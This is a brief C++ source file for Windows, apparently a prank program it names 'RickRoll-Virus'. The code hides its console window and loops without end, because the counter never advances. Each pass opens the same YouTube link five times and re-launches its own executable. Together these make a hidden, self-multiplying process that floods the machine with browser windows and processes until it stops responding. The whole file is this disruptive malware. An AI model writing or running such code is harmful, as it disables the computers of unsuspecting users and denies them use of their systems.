#include <iostream>
#include <windows.h>
#include <shellapi.h>

 using namespace std; 

 int main()

 { 

	for (int i = 0; i < 10; ) {
	
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);

	Sleep(1010);
        ShellExecute(0,0, "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_HIDE);
	ShellExecute(0,0, "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_HIDE);
	ShellExecute(0,0, "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_HIDE);
	ShellExecute(0,0, "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_HIDE);
	ShellExecute(0,0, "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 0, 0, SW_HIDE);
	ShellExecute(0,0, "RickRoll-Virus.exe", 0, 0, SW_HIDE);

     }
	return 0;



 }
